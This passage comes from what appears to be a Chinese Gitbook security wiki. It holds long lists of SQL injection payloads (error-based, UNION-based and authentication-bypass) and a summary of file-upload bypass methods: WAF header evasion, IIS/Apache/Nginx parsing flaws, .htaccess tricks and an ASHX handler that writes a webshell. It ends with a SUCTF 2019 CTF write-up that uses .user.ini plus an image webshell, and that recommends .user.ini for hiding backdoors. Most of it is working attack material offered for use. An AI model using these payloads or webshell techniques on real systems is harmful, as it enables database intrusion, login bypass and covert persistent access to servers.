SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))# UNION ALL SELECT NULL AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113))) AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113))) AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC) AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- UNION ALL SELECT 'INJ'||'ECT'||'XXX' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 UNION ALL SELECT 'INJ'||'ECT'||'XXX'-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- UNION ALL SELECT 'INJ'||'ECT'||'XXX'# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25# 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-27 23:20:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"sql/sql注入payloads/SQL注入 Auth Bypass Payloads.html":{"url":"sql/sql注入payloads/SQL注入 Auth Bypass Payloads.html","title":"SQL注入 Auth Bypass Payloads","keywords":"","body":"SQL注入 Auth Bypass Payloads '-' ' ' '&' '^' '*' ' or ''-' ' or '' ' ' or ''&' ' or ''^' ' or ''*' \"-\" \" \" \"&\" \"^\" \"*\" \" or \"\"-\" \" or \"\" \" \" or \"\"&\" \" or \"\"^\" \" or \"\"*\" or true-- \" or true-- ' or true-- \") or true-- ') or true-- ' or 'x'='x ') or ('x')=('x ')) or (('x'))=(('x \" or \"x\"=\"x \") or (\"x\")=(\"x \")) or ((\"x\"))=((\"x or 1=1 or 1=1-- or 1=1# or 1=1/* admin' -- admin' # admin'/* admin' or '1'='1 admin' or '1'='1'-- admin' or '1'='1'# admin' or '1'='1'/* admin'or 1=1 or ''=' admin' or 1=1 admin' or 1=1-- admin' or 1=1# admin' or 1=1/* admin') or ('1'='1 admin') or ('1'='1'-- admin') or ('1'='1'# admin') or ('1'='1'/* admin') or '1'='1 admin') or '1'='1'-- admin') or '1'='1'# admin') or '1'='1'/* 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055 admin\" -- admin\" # admin\"/* admin\" or \"1\"=\"1 admin\" or \"1\"=\"1\"-- admin\" or \"1\"=\"1\"# admin\" or \"1\"=\"1\"/* admin\"or 1=1 or \"\"=\" admin\" or 1=1 admin\" or 1=1-- admin\" or 1=1# admin\" or 1=1/* admin\") or (\"1\"=\"1 admin\") or (\"1\"=\"1\"-- admin\") or (\"1\"=\"1\"# admin\") or (\"1\"=\"1\"/* admin\") or \"1\"=\"1 admin\") or \"1\"=\"1\"-- admin\") or \"1\"=\"1\"# admin\") or \"1\"=\"1\"/* 1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-27 23:21:29 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"上传绕过/上传绕过总结.html":{"url":"上传绕过/上传绕过总结.html","title":"上传绕过总结","keywords":"","body":"上传绕过整理 WAF绕过 安全狗绕过 1.绕过思路：对文件的内容，数据。数据包进行处理。 关键点在这里Content-Disposition: form-data; name=\"file\"; filename=\"ian.php\" 将form-data; 修改为~form-data; 2.通过替换大小写来进行绕过 Content-Disposition: form-data; name=\"file\"; filename=\"yjh.php\" Content-Type: application/octet-stream 将Content-Disposition 修改为content-Disposition 将 form-data 修改为Form-data 将 Content-Type 修改为content-Type 3.通过删减空格来进行绕过 Content-Disposition: form-data; name=\"file\"; filename=\"yjh.php\" Content-Type: application/octet-stream 将Content-Disposition: form-data 冒号后面 增加或减少一个空格 将form-data; name=\"file\"; 分号后面 增加或减少一个空格 将 Content-Type: application/octet-stream 冒号后面 增加一个空格 4.通过字符串拼接绕过 看Content-Disposition: form-data; name=\"file\"; filename=\"yjh3.php\" 将 form-data 修改为 f+orm-data 将 from-data 修改为 form-d+ata 5.双文件上传绕过 6.HTTP header 属性值绕过 Content-Disposition: form-data; name=\"file\"; filename=\"yjh.php\" 我们通过替换form-data 为*来绕过 Content-Disposition: *; name=\"file\"; filename=\"yjh.php\" 7.HTTP header 属性名称绕过 源代码: Content-Disposition: form-data; name=\"image\"; filename=\"085733uykwusqcs8vw8wky.png\"Content-Type: image/png 绕过内容如下： Content-Disposition: form-data; name=\"image\"; filename=\"085733uykwusqcs8vw8wky.png C.php\" 删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php\". 8.等效替换绕过 原内容： Content-Type: multipart/form-data; boundary=---------------------------471463142114 修改后: Content-Type: multipart/form-data; boundary =---------------------------471463142114 boundary后面加入空格。 9.修改编码绕过 使用UTF-16、Unicode、双URL编码等等 WTS-WAF 绕过上传 原内容： Content-Disposition: form-data; name=\"up_picture\"; filename=\"xss.php\" 添加回车 Content-Disposition: form-data; name=\"up_picture\"; filename=\"xss.php\" 百度云上传绕过 百度云绕过就简单的很多很多，在对文件名大小写上面没有检测php是过了的，Php就能过，或者PHP，一句话自己合成图片马用Xise连接即可。 Content-Disposition: form-data; name=\"up_picture\"; filename=\"xss.jpg .Php\" 阿里云上传绕过 源代码： Content-Disposition: form-data; name=\"img_crop_file\"; filename=\"1.jpg .Php\"Content-Type: image/jpeg 修改如下： Content-Disposition: form-data; name=\"img_crop_file\"; filename=\"1.php\" 没错，将=号这里回车删除掉Content-Type: image/jpeg即可绕过。 360主机上传绕过 源代码: Content-Disposition: form-data; name=\"image\"; filename=\"085733uykwusqcs8vw8wky.png\"Content-Type: image/png 绕过内容如下： Content- Disposition: form-data; name=\"image\"; filename=\"085733uykwusqcs8vw8wky.png Content-Disposition 修改为 Content-空格Disposition MIME类型绕过 上传木马时，提示格式错误。直接抓包修改Content-Type 为正确的格式尝试绕过 文件内容检测绕过 抓包，在正常图片末尾添加一句话木马 多次上传Win特性绕过 多次上传同一个文件，windows会自动更新补全TEST (1).php。 有时会触发条件竞争，导致绕过。 条件竞争绕过 通过BURP不断发包，导致不断写入Webshell，再写入速度频率上超过安全软件查杀频率，导致绕过。 CONTENT-LENGTH绕过 针对这种类型的验证，我们可以通过上传一些非常短的恶意代码来绕过。上传文件的大小取决于，Web服务器上的最大长度限制。我们可以使用不同大小的文件来fuzzing上传程序，从而计算出它的限制范围。 文件内容检测绕过 针对文件内容检测的绕过，一般有两种方式， 1.制作图片马 2.文件幻术头绕过 垃圾数据填充绕过 修改HTTP请求，再之中加入大量垃圾数据。 黑名单后缀绕过 文件扩展名绕过 Php除了可以解析php后缀 还可以解析php2.php3，php4 后缀 ashx上传绕过 cer,asa,cdx等等无法使用时候。 解析后就会生成一个test.asp的马，你就可以连接这个test.asp 密码为:put using System; using System.Web; using System.IO; public class Handler : IHttpHandler { public void ProcessRequest (HttpContext context) { context.Response.ContentType = \"text/plain\"; //这里会在目录下生成一个test.asp的文件 StreamWriter file1= File.CreateText(context.Server.MapPath(\"test.asp\")); //这里是写入一句话木马 密码是：ptu file1.Write(\"\"); file1.Flush(); file1.Close(); } public bool IsReusable { get { return false; } } } 特殊文件名绕过 比如发送的 http包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式 在windows系统里是不被允许的，所以需要在 burp之类里进行修改，然后绕过验证后，会 被windows系统自动去掉后面的点和空格，但要注意Unix/Linux系统没有这个特性。 Windows流特性绕过 php在windows的时候如果文件名+\"::$DATA\"会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持\"::$DATA\"之前的文件名。 白名单后缀绕过 00截断绕过上传 php .jpg 空格二进制20改为00 IIS 6.0 目录路径检测解析绕过 上传路径改为 XXX/1.asp/ htaccess解析漏洞 上传的jpg文件都会以php格式解析 .htaccess内容： AddType application/x-httpd-php .jpg 突破MIME限制上传 方法：找一个正常的可上传的查看其的MIME类型，然后将马子的MIME改成合法的MIME即可。 Apache解析漏洞 1.一个文件名为test.x1.x2.x3的文件，apache会从x3的位置开始尝试解析，如果x3不属于apache能够解析的扩展名，那么apache会尝试去解析x2，直到能够解析到能够解析的为止，否则就会报错。 2.CVE-2017-15715，这个漏洞利用方式就是上传一个文件名最后带有换行符(只能是\\x0A，如上传a.php，然后在burp中修改文件名为a.php\\x0A)，以此来绕过一些黑名单过滤。 IIS解析漏洞 IIS6.0在解析asp格式的时候有两个解析漏洞，一个是如果目录名包含\".asp\"字符串， 那么这个目录下所有的文件都会按照asp去解析，另一个是只要文件名中含有\".asp;\" 会优先按asp来解析 IIS7.0/7.5是对php解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL 后面追加上字符串\"/任意文件名.php\"就会按照php的方式去解析； Nginx解析漏洞 解析： (任意文件名)/(任意文件名).php | (任意文件名)%00.php 描述：目前Nginx主要有这两种漏洞，一个是对任意文件名，在后面添加/任意文件名.php 的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg/x.php进行解析攻击。 还有一种是对低版本的Nginx可以在任意文件名后面添加%00.php进行解析攻击。 解析漏洞 Content-Disposition: form-data; name=\"file\"; filename=php.php;.jpg 前端限制绕过 1.使用BURP抓包修改后重放 2.或者使用浏览器中元素审查，修改允许或禁止上传文件类型。 下载绕过 远程下载文件绕过 文件包含绕过 上传图片木马 $x=$_GET['x']; include($x); 访问:http://www.xxxx.com/news.php?x=xxxxxx.jpg 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-06 10:21:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"上传绕过/1.html":{"url":"上传绕过/1.html","title":"user.ini的利用","keywords":"","body":"user.ini的利用 前言 在前段时间SUCTF 2019的比赛中做了一道名为CheckIn的文件上传题，学到了一种新的利用姿势——.user.ini。 原题的链接已经失效了，但SU的师傅们把题目源码贴在GitHub上了（感谢师傅们！！），如果想尝试的话可以下载源码复现，在这里放一下地址： https://github.com/team-su/SUCTF-2019 CheckIn题目分析 首先我们来看一下题目，首页就是一个简单的上传界面： 我们先上传一个php文件试一下，显然是illegal的 经过fuzz发现修改content-type和利用特殊扩展名php5、pht等都没有成功（当然也不会这么简单233） 然后我们把扩展名改为aaa试一下会怎样，发现回显： 我们再把文件内容换一下，发现回显：exif_imagetype:not image!，猜测后端应该调用了php的exif_imagetype()函数，这个很好绕过，添加图片文件头就可以了 我们添加最简单的gif文件头GIF89a，发现上传成功（注意看该文件夹下还有一个index.php，当时没有注意，但在后面有大用处） 我们先来捋一下思路： -> 上传过滤为黑名单，但php脚本文件应该是无法上传的 -> 存在文件头过滤，需要添加图片文件的文件头 -> 文件的内容不能包含类型的图片马来绕过 既然是黑名单过滤而且可以上传图片马，那我们首先想到的肯定是传一个.htaccess上去来将图片马解析为php，而这种方法经过尝试发现失败了。。。 看了一下服务器是nginx 1.10.3，似乎版本较高，不存在解析漏洞。 随后在网上看到了一篇p牛的文章，讲的是利用.user.ini来上传php后门 .user.ini 我们先在php手册上看一下对.user.ini的介绍： 大致意思就是：我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：require(./a.jpg); 这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有exit()时该设置无效） 寻找突破getflag 看过.user.ini的分析后我们的思路应该比较清晰了，我们可以上传一个这样的.user.ini： GIF89a auto_prepend_file=a.jpg 此时我们注意到上传目录下还有一个index.php，我们正好需要该目录下有一个可执行php文件，那这简直暴露了考点就是.user.ini，看来这个思路应该是可行的 然后再上传一个这样的图片马a.jpg： GIF89a system('cat /flag'); 最后，我们访问http://192.168.177.152:9021/uploads/6683eb5bfa1174bd139499256f60b7ab/index.php 即可得到flag .user.ini实战利用的可能性 综上所述.user.ini的利用条件如下： 服务器脚本语言为PHP 服务器使用CGI／FastCGI模式 上传目录下要有可执行的php文件 从这来看.user.ini要比.htaccess的应用范围要广一些，毕竟.htaccess只能用于Apache 但仔细推敲我们就会感到“上传目录下要有可执行的php文件”这个要求在文件上传中也比较苛刻，应该没有天才开发者会把上传文件放在主目录或者把php文件放在上传文件夹。 但也不是全无办法，如果我们根据实际情况配合其他漏洞使用可能会有奇效，前段时间我遇到一个CMS对上传时的路径没有检测../，因此导致文件可被上传至任意目录，这种情况下我们就很有可能可以利用.user.ini 除此之外，把.user.ini利用在隐藏后门上应该是个很好的利用方法，我们在存在php文件的目录下留下.user.ini和我们的图片马，这样就达到了隐藏后门的目的。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-20 18:19:47 